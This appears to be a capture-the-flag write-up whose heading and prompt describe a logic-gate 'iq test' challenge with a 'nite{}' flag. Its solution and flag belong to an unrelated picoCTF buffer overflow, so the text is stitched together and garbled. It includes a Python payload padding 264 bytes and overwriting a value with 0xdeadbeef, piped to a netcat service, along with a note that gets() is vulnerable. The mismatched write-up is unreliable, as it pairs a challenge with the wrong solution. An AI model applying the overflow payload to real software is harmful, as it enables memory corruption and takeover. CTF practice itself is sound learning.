# 1. iq test

> let your input x = 30478191278.

wrap your answer with nite{ } for the flag.

As an example, entering x = 34359738368 gives (y0, ..., y11), so the flag would be nite{010000000011}.

## Solution:
- got stuck for quite some time on how to begin as with logic gates, i was normally used to givin binary input, then thought of converting given x value to binary online. got 36 digit binary `011100011000101001000100101010101110`
- had to manually workout the logic gate given with this input with positions x0-x35
```bash
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
cat: flag.txt: No such file or directory
```

```py
import struct
print('A'*264+struct.pack('l',0xdeadbeef))
```
- piped it to nc connection command and got flag

## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:

- buffer overflow and gets is vulnerable to it
- using struct module in python to convert stuff to bytes



***



